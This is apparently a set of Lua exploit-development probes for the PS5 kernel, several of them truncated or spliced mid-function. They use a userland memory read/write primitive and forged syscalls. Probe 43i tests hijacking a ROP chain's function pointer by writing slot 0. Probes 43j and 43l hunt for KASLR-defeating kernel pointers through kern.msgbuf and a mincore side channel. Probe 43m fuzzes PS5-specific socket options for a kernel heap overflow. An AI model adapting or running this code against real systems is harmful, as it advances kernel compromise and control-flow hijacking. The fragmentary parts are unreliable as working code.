end
print("")

print("--- TEST 2: CHAIN AFTER PIPE ---")

local pipe_buf = memory.alloc(16)
safe_wd(pipe_buf, 0)
safe_wd(pipe_buf + 4, 0)
pcall(function() sc_pipe(pipe_buf) end)

-- Record chain state
local state_pipe = {}
for off = 0, 0x2F8, 8 do
    state_pipe[off] = safe_rq(rop_base + off)
end

local fn_after_pipe = safe_rq(fn_addr)
print("fn_addr after pipe: " .. qw_hex(fn_after_pipe))

-- Find differences
local diffs = 0
for off = 0, 0x2F8, 8 do
    local a = state_getpid[off]
    local b = state_pipe[off]
    if a and b then
        local _, ah, al = qw_hex(a)
        local _, bh, bl = qw_hex(b)
        if ah ~= bh or al ~= bl then
            diffs = diffs + 1
            print(string.format("  DIFF +0x%03X: %s -> %s", off, qw_hex(a), qw_hex(b)))
        end
    end
end
print("total diffs: " .. diffs)
print("")

--------------------------------------------------------------------
-- TEST 3: Write test value to fn_addr, then see if getpid rebuilds it
--------------------------------------------------------------------
print("--- TEST 3: FN_ADDR WRITE PERSISTENCE ---")

-- Save original
local fn_saved = safe_rq(fn_addr)
print("original fn_addr: " .. qw_hex(fn_saved))

-- Write test value
safe_wq(fn_addr, uint64("0xDEADBEEFCAFEBABE"))
local fn_test = safe_rq(fn_addr)
print("after test write: " .. qw_hex(fn_test))

-- Now call getpid — this should rebuild the chain
-- The chain will write fn_addr from slot 0
local ok, pid2 = pcall(function() return sc_getpid() end)
print("getpid ok: " .. tostring(ok) .. " pid: " .. (pid2 and to_num(pid2) or -1))

-- Check fn_addr — was it overwritten by the chain rebuild?
local fn_after = safe_rq(fn_addr)
print("fn_addr after getpid: " .. qw_hex(fn_after))

-- Did it get restored to the syscall stub?
if fn_after then
    local _, fah, fal = qw_hex(fn_after)
    local _, fsh, fsl = qw_hex(fn_saved)
    if fah == fsh and fal == fsl then
        print("RESULT: chain REBUILDS fn_addr each call")
    else
        print("RESULT: fn_addr was NOT rebuilt! Our write persists!")
    end
end
print("")

--------------------------------------------------------------------
-- TEST 4: Write to slot 0 (the source that loads into fn_addr)
-- If the chain reads fn_addr from slot 0, and we control slot 0,
-- the chain will load OUR address into fn_addr and call it.
--------------------------------------------------------------------
print("--- TEST 4: SLOT 0 WRITE TEST ---")

if slot0_addr then
    local slot0_saved = safe_rq(slot0_addr)
    print("slot0 original: " .. (slot0_saved and qw_hex(slot0_saved) or "nil"))

    -- Write a harmless test value
    safe_wq(slot0_addr, uint64("0x4141414141414141"))
    local slot0_test = safe_rq(slot0_addr)
    print("slot0 after write: " .. (slot0_test and qw_hex(slot0_test) or "nil"))

    -- Call getpid — if the chain reads from slot 0, fn_addr should
    -- now be 0x4141414141414141 and the call should CRASH
    -- So DON'T actually call! Just check if our write persisted.

    -- Actually, let's see if getpid REBUILDS slot 0
    -- Restore slot 0 first to be safe
    safe_wq(slot0_addr, slot0_saved)
    local slot0_restored = safe_rq(slot0_addr)
    print("slot0 restored: " .. (slot0_restored and qw_hex(slot0_restored) or "nil"))

    -- Now call getpid to prime, then check slot 0 again
    pcall(function() sc_getpid() end)
    local slot0_after = safe_rq(slot0_addr)
    print("slot0 after getpid: " .. (slot0_after and qw_hex(slot0_after) or "nil"))

    -- Check if it changed
    if slot0_saved and slot0_after then
        local _, sh, sl = qw_hex(slot0_saved)
        local _, ah, al = qw_hex(slot0_after)
        if sh == ah and sl == al then
            print("RESULT: slot0 SAME after call — NOT rebuilt by chain")
            print("*** This means we can control fn_addr by writing slot0! ***")
        else
            print("RESULT: slot0 changed — rebuilt by chain")
        end
    end
end

print("")
print("=== PROBE 43i COMPLETE ===")
```

## probes/phase10_untested_theories/43j_msgbuf_full_read.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 43j: Full kern.msgbuf read
--
-- Context: Probe 42b read kern.msgbuf with only 8 bytes and got 0x7EF710000.
-- The kernel message buffer (dmesg) is typically 32-256KB and contains boot
-- messages that often include kernel module load addresses, memory layout,
-- and driver init data. A full read could leak KASLR-defeating addresses.

print("=== PROBE 43j: KERN.MSGBUF FULL READ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_sysctl = make_syscall(202)

-- Helper: call sysctl with given MIB and buffer
local function do_sysctl(mib_vals, mib_cnt, buf, bufsize)
    local mib = memory.alloc(mib_cnt * 4)
    for i = 0, mib_cnt - 1 do
        safe_wd(mib + i * 4, mib_vals[i + 1])
    end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, bufsize)
    safe_wd(oldlenp + 4, 0)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(mib_cnt), uint64(buf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    if not ok then return -999, 0 end
    local rlen = safe_rd(oldlenp) or 0
    return to_num(ret), rlen
end

-- === STEP 1: SIZE QUERY FOR kern.msgbuf ===
print("--- STEP 1: kern.msgbuf size query ---")
local size_buf = memory.alloc(8)
safe_wd(size_buf, 0)
safe_wd(size_buf + 4, 0)

-- kern.msgbuf = {CTL_KERN=1, KERN_MSGBUF=33}
local mib_msgbuf = {1, 33}
local ret, rlen = do_sysctl(mib_msgbuf, 2, 0, 0)
print(string.format("  size query: ret=%d rlen=%d", ret, rlen))

-- If size query failed, try with a buffer anyway
if rlen == 0 then rlen = 65536 end

-- Cap at 64KB for safety
if rlen > 65536 then rlen = 65536 end
print(string.format("  using buffer size: %d", rlen))

-- === STEP 2: FULL READ ===
print("")
print("--- STEP 2: Full kern.msgbuf read ---")
local buf = memory.alloc(rlen + 16)
-- Zero the buffer
for i = 0, math.min(rlen - 1, 1023) do
    pcall(function() memory.write_byte(buf + i, 0) end)
end

local ret2, rlen2 = do_sysctl(mib_msgbuf, 2, buf, rlen)
print(string.format("  ret=%d actual_len=%d", ret2, rlen2))

if ret2 == 0 and rlen2 > 0 then
    -- Scan for kernel pointers
    print("")
    print("--- STEP 3: Kernel pointer scan ---")
    local kptrs = 0
    local interesting = 0
    local step = 8
    local limit = math.min(rlen2, 65536)
    for off = 0, limit - 8, step do
        local val = safe_rq(buf + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print(string.format("  KPTR +0x%03X: %08X_%08X", off, h, l))
            end
        end
    end
    print(string.format("  kernel pointers found: %d", kptrs))

    -- Try to extract readable text (boot messages)
    print("")
    print("--- STEP 4: Text extraction ---")
    local text = {}
    local readable = 0
    for off = 0, math.min(rlen2 - 1, 4095) do
        local b = safe_rb(buf + off)
        if b and b >= 32 and b < 127 then
            text[#text + 1] = string.char(b)
            readable = readable + 1
        elseif b == 10 or b == 13 then
            text[#text + 1] = "\n"
        elseif b == 0 and #text > 0 then
            break
        else
            text[#text + 1] = "."
        end
    end
    print(string.format("  readable bytes in first 4KB: %d", readable))
    if #text > 0 then
        local s = table.concat(text)
        -- Print in chunks
        local chunk = 200
        for i = 1, math.min(#s, 2000), chunk do
            print("  " .. s:sub(i, i + chunk - 1))
        end
    end

    -- Hex dump of first 256 bytes
    print("")
    print("--- STEP 5: First 256 bytes hex ---")
    for row = 0, 240, 16 do
        if row >= rlen2 then break end
        local hex = ""
        for col = 0, 15 do
            local b = safe_rb(buf + row + col)
            if b then
                hex = hex .. string.format("%02X ", b)
            else
                hex = hex .. "?? "
            end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
else
    print("  kern.msgbuf read FAILED")
    print("")
    -- Try alternative: small buffer read (repeat what 42b did but capture more)
    print("--- FALLBACK: Read with 8KB buffer ---")
    local buf2 = memory.alloc(8192)
    local ret3, rlen3 = do_sysctl(mib_msgbuf, 2, buf2, 8192)
    print(string.format("  ret=%d actual_len=%d", ret3, rlen3))
    if ret3 == 0 and rlen3 > 0 then
        for row = 0, math.min(rlen3 - 1, 255), 16 do
            local hex = ""
            for col = 0, 15 do
                local b = safe_rb(buf2 + row + col)
                if b then
                    hex = hex .. string.format("%02X ", b)
                else
                    hex = hex .. "?? "
                end
            end
            print(string.format("  +%03X: %s", row, hex))
        end
    end
end

-- === STEP 6: OTHER PROMISING SYSCTLS ===
print("")
print("--- STEP 6: Other sysctl reads ---")

-- kern.proc.auxv full read
print("  kern.proc.auxv (full):")
local auxv_buf = memory.alloc(512)
local ret_auxv, len_auxv = do_sysctl({1, 14, 16, pid}, 4, auxv_buf, 512)
print(string.format("    ret=%d len=%d", ret_auxv, len_auxv))
if ret_auxv == 0 and len_auxv > 0 then
    for off = 0, math.min(len_auxv - 1, 255), 8 do
        local val = safe_rq(auxv_buf + off)
        if val then
            local h, l = get_hi_lo(val)
            print(string.format("    +%03X: %08X_%08X", off, h, l))
        end
    end
end

-- kern.features full read
print("  kern.features (full):")
local feat_buf = memory.alloc(256)
local ret_feat, len_feat = do_sysctl({1, 36}, 2, feat_buf, 256)
print(string.format("    ret=%d len=%d", ret_feat, len_feat))
if ret_feat == 0 and len_feat > 0 then
    local feat_text = {}
    for i = 0, math.min(len_feat - 1, 255) do
        local b = safe_rb(feat_buf + i)
        if b and b >= 32 and b < 127 then
            feat_text[#feat_text + 1] = string.char(b)
        elseif b == 0 and #feat_text > 0 then
            break
        end
    end
    print("    text: " .. table.concat(feat_text))
end

-- kern.boottime
print("  kern.boottime:")
local bt_buf = memory.alloc(32)
local ret_bt, len_bt = do_sysctl({1, 21}, 2, bt_buf, 32)
print(string.format("    ret=%d len=%d", ret_bt, len_bt))
if ret_bt == 0 and len_bt > 0 then
    for off = 0, len_bt - 1, 8 do
        local val = safe_rq(bt_buf + off)
        if val then
            local h, l = get_hi_lo(val)
            print(string.format("    +%03X: %08X_%08X", off, h, l))
        end
    end
end

print("")
print("=== PROBE 43j COMPLETE ===")
```

## probes/phase10_untested_theories/43k_cpuusage_deep.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 43k: sceKernelGetCpuUsage deep investigation
--
-- Context: Probe 42f found syscall 617 (sceKernelGetCpuUsage) returns ret=0
-- with an empty 8-byte buffer. This is one of only TWO Sony syscalls that
-- succeeded (the other being 585/mtypeprotect). A larger output buffer and
-- systematic argument testing may reveal CPU usage data structures that
-- contain kernel pointers (scheduler data, per-CPU structs, thread lists).

print("=== PROBE 43k: sceKernelGetCpuUsage DEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc617 = make_syscall(617)

-- === STEP 1: Basic call with various buffer sizes ===
print("--- STEP 1: Buffer size sweep ---")
local sizes = {8, 16, 32, 64, 128, 256, 512, 1024, 4096}
for _, sz in ipairs(sizes) do
    local buf = memory.alloc(sz + 16)
    for i = 0, math.min(sz - 1, 255) do
        pcall(function() memory.write_byte(buf + i, 0xAA) end)
    end
    local ok, ret = pcall(function()
        return sc617(uint64(buf), uint64(sz), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  size=%d: CRASH", sz))
    else
        local r = to_num(ret)
        local changed = 0
        for i = 0, math.min(sz - 1, 255) do
            local b = safe_rb(buf + i)
            if b and b ~= 0xAA then changed = changed + 1 end
        end
        print(string.format("  size=%d: ret=%d changed_bytes=%d", sz, r, changed))
        if changed > 0 then
            local limit = math.min(changed + 16, sz, 256)
            for row = 0, limit - 1, 16 do
                local hex = ""
                for col = 0, 15 do
                    if row + col < sz then
                        local b = safe_rb(buf + row + col)
                        if b then
                            hex = hex .. string.format("%02X ", b)
                        else
                            hex = hex .. "?? "
                        end
                    end
                end
                print(string.format("    +%03X: %s", row, hex))
            end
        end
    end
end
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 43l: mincore() as KASLR side-channel oracle
--
-- Context: Probe 42i confirmed mincore() works (ret=0, vec=0x1F for 5 resident
-- pages). mincore() reports whether virtual pages are resident in physical memory.
-- On FreeBSD, kernel text/data is mapped at DMAP or KERNBASE. If we can probe
-- page residency at guessed kernel addresses via mincore(), we can detect the
-- kernel base without needing a direct pointer leak. Even if kernel VA probing
-- fails, we can use mincore() to map our own process's memory layout precisely.

print("=== PROBE 43l: MINCORE KASLR ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_mincore = make_syscall(78)  -- mincore
local PAGE = 0x4000  -- 16KB pages

-- === STEP 1: Verify mincore works on our own mappings ===
print("--- STEP 1: Verify mincore on known mappings ---")

-- Get eboot base (known mapped region)
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108) or 0
local eboot_hi = safe_rd(info + 0x10C) or 0
local eboot_sz_lo = safe_rd(info + 0x110) or 0
print(string.format("  eboot text: %08X_%08X size: 0x%X", eboot_hi, eboot_lo, eboot_sz_lo))

-- Test mincore on eboot pages
local npages = 4
local vec = memory.alloc(npages + 16)
for i = 0, npages - 1 do
    pcall(function() memory.write_byte(vec + i, 0xFF) end)
end
local eboot_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
local ok1, ret1 = pcall(function()
    return sc_mincore(eboot_addr, uint64(npages * PAGE), uint64(vec),
        uint64(0), uint64(0), uint64(0))
end)
if ok1 then
    local bits = ""
    for i = 0, npages - 1 do
        local b = safe_rb(vec + i)
        bits = bits .. string.format("%02X ", b or 0xFF)
    end
    print(string.format("  eboot mincore: ret=%d vec=[%s]", to_num(ret1), bits))
else
    print("  eboot mincore: CRASH")
end

-- Test on GPU mmap (heap region)
local sc_mmap = make_syscall(477)
local ok_gpu, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(32 * PAGE), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_gpu then
    local gh, gl = get_hi_lo(gpu)
    print(string.format("  GPU mmap: %08X_%08X", gh, gl))
    local vec2 = memory.alloc(32 + 16)
    for i = 0, 31 do
        pcall(function() memory.write_byte(vec2 + i, 0xFF) end)
    end
    local ok2, ret2 = pcall(function()
        return sc_mincore(gpu, uint64(32 * PAGE), uint64(vec2),
            uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        local resident = 0
        for i = 0, 31 do
            local b = safe_rb(vec2 + i)
            if b and (b % 2) == 1 then resident = resident + 1 end
        end
        print(string.format("  GPU mincore: ret=%d resident=%d/32", to_num(ret2), resident))
    end
end

-- Test on unmapped address (should fail)
local vec3 = memory.alloc(16)
pcall(function() memory.write_byte(vec3, 0xFF) end)
local ok3, ret3 = pcall(function()
    return sc_mincore(uint64(0x7F0000000000), uint64(PAGE), uint64(vec3),
        uint64(0), uint64(0), uint64(0))
end)
if ok3 then
    print(string.format("  unmapped mincore: ret=%d", to_num(ret3)))
else
    print("  unmapped mincore: CRASH")
end

-- === STEP 2: Probe kernel virtual address ranges ===
print("")
print("--- STEP 2: Kernel VA range probing ---")
-- FreeBSD kernel VA ranges to test:
-- KERNBASE typically at 0xFFFF800000000000+ on amd64
-- DMAP starts at 0xFFFFF80000000000 on stock FreeBSD
-- PS5 may use different layout

local kernel_ranges = {
    {0xFFFF8000, 0x00000000, "KERNBASE low"},
    {0xFFFF8000, 0x00200000, "KERNBASE +2MB"},
    {0xFFFF8000, 0x01000000, "KERNBASE +16MB"},
    {0xFFFF8000, 0x02000000, "KERNBASE +32MB"},
    {0xFFFF8001, 0x00000000, "KERNBASE +4GB"},
    {0xFFFF8002, 0x00000000, "KERNBASE +8GB"},
    {0xFFFF8004, 0x00000000, "KERNBASE +16GB"},
    {0xFFFF8008, 0x00000000, "KERNBASE +32GB"},
    {0xFFFF8010, 0x00000000, "KERNBASE +64GB"},
    {0xFFFF8020, 0x00000000, "KERNBASE +128GB"},
    {0xFFFF8040, 0x00000000, "KERNBASE +256GB"},
    {0xFFFF8080, 0x00000000, "KERNBASE +512GB"},
    {0xFFFFF800, 0x00000000, "DMAP base"},
    {0xFFFFF800, 0x10000000, "DMAP +256MB"},
    {0xFFFFF800, 0x80000000, "DMAP +2GB"},
    {0xFFFFF801, 0x00000000, "DMAP +4GB"},
    {0xFFFFFF80, 0x00000000, "High kernel"},
}

local vec4 = memory.alloc(16)
for _, range in ipairs(kernel_ranges) do
    pcall(function() memory.write_byte(vec4, 0xFF) end)
    local addr = uint64(string.format("0x%X%08X", range[1], range[2]))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec4),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  %s (%08X_%08X): CRASH", range[3], range[1], range[2]))
    else
        local r = to_num(ret)
        local v = safe_rb(vec4) or 0xFF
        if r == 0 then
            print(string.format("  %s (%08X_%08X): ret=0 vec=%02X  *** HIT ***",
                range[3], range[1], range[2], v))
        else
            print(string.format("  %s (%08X_%08X): ret=%d", range[3], range[1], range[2], r))
        end
    end
end

-- === STEP 3: Use kern.msgbuf value as pivot ===
print("")
print("--- STEP 3: Probe around kern.msgbuf value 0x7EF710000 ---")
-- 42b found kern.msgbuf returned 0x7EF710000. Test nearby addresses.
local msgbuf_base_hi = 0x00000007
local msgbuf_base_lo = 0xEF710000

local offsets = {
    {0, 0, "exact"},
    {0, -0x10000, "-64K"},
    {0, 0x10000, "+64K"},
    {0, -0x100000, "-1MB"},
    {0, 0x100000, "+1MB"},
    {0, -0x1000000, "-16MB"},
    {0, 0x1000000, "+16MB"},
}

local vec5 = memory.alloc(16)
for _, off in ipairs(offsets) do
    local test_hi = msgbuf_base_hi + off[1]
    local test_lo = msgbuf_base_lo + off[2]
    if test_lo < 0 then
        test_hi = test_hi - 1
        test_lo = test_lo + 0x100000000
    end
    if test_lo >= 0x100000000 then
        test_hi = test_hi + 1
        test_lo = test_lo - 0x100000000
    end
    -- Align to page
    test_lo = test_lo - (test_lo % PAGE)

    pcall(function() memory.write_byte(vec5, 0xFF) end)
    local addr = uint64(string.format("0x%X%08X", test_hi, test_lo))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec5),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  0x%08X_%08X (%s): CRASH", test_hi, test_lo, off[3]))
    else
        local r = to_num(ret)
        local v = safe_rb(vec5) or 0xFF
        print(string.format("  0x%08X_%08X (%s): ret=%d vec=%02X",
            test_hi, test_lo, off[3], r, v))
    end
end

-- === STEP 4: Scan our own process VA space for unmapped holes ===
print("")
print("--- STEP 4: Process VA space mapping via mincore ---")
-- Scan typical userland ranges to find mapped regions
local scan_ranges = {
    {0x00000000, 0x00400000, "low 4MB"},
    {0x00000000, 0x10000000, "256MB"},
    {0x00000000, 0x40000000, "1GB"},
    {0x00000000, 0x80000000, "2GB"},
    {0x00000001, 0x00000000, "4GB"},
    {0x00000002, 0x00000000, "8GB"},
    {0x00000004, 0x00000000, "16GB"},
    {0x00000008, 0x00000000, "32GB"},
    {0x00000010, 0x00000000, "64GB"},
    {0x00000020, 0x00000000, "128GB"},
    {0x00000040, 0x00000000, "256GB"},
    {0x00000080, 0x00000000, "512GB"},
    {0x00000100, 0x00000000, "1TB"},
    {0x00000200, 0x00000000, "2TB"},
    {0x00000400, 0x00000000, "4TB"},
    {0x00007F00, 0x00000000, "user high"},
}

local vec6 = memory.alloc(16)
for _, sr in ipairs(scan_ranges) do

    local addr = uint64(string.format("0x%X%08X", sr[1], sr[2]))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec6),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  %s (%08X_%08X): CRASH", sr[3], sr[1], sr[2]))
```

## probes/phase10_untested_theories/43m_sockopt_overflow.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 43m: PS5 socket option buffer overflow test
--
-- Context: Probe 31c found 5 PS5-specific socket options (0x2000, 0x10000,
-- 0x20000, 0x40000, 0x100000) that all accept set(len=256) with rv=0.
-- These are boolean flags (4 bytes) but the kernel accepted 256-byte writes.
-- If the kernel copies the full user buffer into a small kernel struct field,
-- this is a kernel heap overflow. We test with progressively larger buffers
-- and check for side effects.

print("=== PROBE 43m: PS5 SOCKOPT BUFFER OVERFLOW ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_close = make_syscall(6)

-- PS5-specific options found in probe 31c
local ps5_opts = {0x2000, 0x10000, 0x20000, 0x40000, 0x100000}

-- === STEP 1: Baseline — verify opts still work with len=4 ===
print("--- STEP 1: Baseline verification (len=4) ---")
local ok_sock, udp_fd = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(17))  -- AF_INET, SOCK_DGRAM, UDP
end)
if not ok_sock then
    print("  FAILED to create UDP socket")
    print("=== PROBE 43m ABORTED ===")
    return
end
local fd = to_num(udp_fd)
print(string.format("  UDP socket fd=%d", fd))

local buf4 = memory.alloc(16)
for _, opt in ipairs(ps5_opts) do
    safe_wd(buf4, 1)  -- enable
    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(fd), uint64(0xFFFF), uint64(opt),
            uint64(buf4), uint64(4), uint64(0))
    end)
    local r = ok and to_num(ret) or -999
    print(string.format("  opt 0x%X set(4): ret=%d", opt, r))
end

-- === STEP 2: Read back — what does getsockopt return? ===
print("")
print("--- STEP 2: Read back via getsockopt ---")
for _, opt in ipairs(ps5_opts) do
    local rbuf = memory.alloc(512)
    local lenp = memory.alloc(8)
    safe_wd(lenp, 256)
    safe_wd(lenp + 4, 0)
    for i = 0, 255 do
        pcall(function() memory.write_byte(rbuf + i, 0xCC) end)
    end

    local ok, ret = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(0xFFFF), uint64(opt),
            uint64(rbuf), uint64(lenp), uint64(0))
    end)
    local r = ok and to_num(ret) or -999
    local rlen = safe_rd(lenp) or 0
    print(string.format("  opt 0x%X get(256): ret=%d rlen=%d", opt, r, rlen))

    if r == 0 and rlen > 0 then
        -- Dump what came back
        local limit = math.min(rlen, 64)
        for row = 0, limit - 1, 16 do
            local hex = ""
            for col = 0, 15 do
                if row + col < rlen then
                    local b = safe_rb(rbuf + row + col)
                    if b then
                        hex = hex .. string.format("%02X ", b)
                    else
                        hex = hex .. "?? "
                    end
                end
            end
            print(string.format("    +%03X: %s", row, hex))
        end

        -- Check for kernel pointers in returned data
        for off = 0, rlen - 8, 8 do
            local val = safe_rq(rbuf + off)
            if val then
                local h, l = get_hi_lo(val)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print(string.format("    KPTR at +%03X: %08X_%08X", off, h, l))
                end
            end
        end
    end
end

-- === STEP 3: Progressive buffer size test ===
print("")
print("--- STEP 3: Progressive setsockopt buffer sizes ---")
-- Use a fresh socket for each dangerous test
local test_opt = 0x2000  -- test with first PS5 opt
local sizes = {4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096}

for _, sz in ipairs(sizes) do
    -- Fresh socket each time in case we corrupt kernel state
    local ok_s, tfd = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(17))
    end)
    if not ok_s then
        print(string.format("  size=%d: can't create socket (kernel may be corrupted!)", sz))
        break
    end
    local tfd_n = to_num(tfd)

    local bigbuf = memory.alloc(sz + 16)
    -- Fill with pattern to detect how much kernel reads
    for i = 0, math.min(sz - 1, 4095) do
        pcall(function() memory.write_byte(bigbuf + i, (i % 254) + 1) end)
    end

    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(tfd_n), uint64(0xFFFF), uint64(test_opt),
            uint64(bigbuf), uint64(sz), uint64(0))
    end)
    local r = ok and to_num(ret) or -999
    print(string.format("  opt 0x%X set(len=%d): ret=%d", test_opt, sz, r))

    -- If it accepted, try to read back
    if r == 0 then
        local rbuf2 = memory.alloc(sz + 16)
        local lenp2 = memory.alloc(8)
        safe_wd(lenp2, sz)
        for i = 0, math.min(sz - 1, 4095) do
            pcall(function() memory.write_byte(rbuf2 + i, 0) end)
        end
        local ok2, ret2 = pcall(function()
            return sc_getsockopt(uint64(tfd_n), uint64(0xFFFF), uint64(test_opt),
```

```lua
-- the HID driver's kernel state, potentially leaking kernel addresses or

    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end

end

    local ok = pcall(function() memory.write_qword(addr, val) end)

    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)

local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end

-- HIDIOCGRDESC = _IOR('H', 0x02, struct hidraw_report_descriptor)

local function make_ior(group, num, len)
    return 0x80000000 + (len * 0x10000) + (group * 0x100) + num
end
local function make_iow(group, num, len)
    return 0x40000000 + (len * 0x10000) + (group * 0x100) + num
end
local function make_iowr(group, num, len)
```

```lua
    safe_wd(mib + 16, 3)  -- NET_RT_IFLIST
    safe_wd(szp, 0)
    safe_wd(szp + 4, 0)
    local ok_if, ret_if = pcall(function()
        return sc_sysctl(uint64(mib), uint64(6), uint64(0),
            uint64(szp), uint64(0), uint64(0))
    end)
    local if_needed = safe_rd(szp) or 0
    print(string.format("  NET_RT_IFLIST size: ret=%d needed=%d",
        ok_if and to_num(ret_if) or -999, if_needed))

    if if_needed > 0 then
        local cap2 = math.min(if_needed, 32768)
        local ifbuf = memory.alloc(cap2 + 16)
        safe_wd(szp, cap2)
        safe_wd(szp + 4, 0)
        local ok_i2, ret_i2 = pcall(function()
            return sc_sysctl(uint64(mib), uint64(6), uint64(ifbuf),
                uint64(szp), uint64(0), uint64(0))
        end)
        local ilen = safe_rd(szp) or 0
        print(string.format("  NET_RT_IFLIST read: ret=%d len=%d",
            ok_i2 and to_num(ret_i2) or -999, ilen))

        if ilen > 0 then
            local kptrs2 = 0
            for off = 0, ilen - 8, 8 do
                local val = safe_rq(ifbuf + off)
                if val then
                    local h, l = get_hi_lo(val)
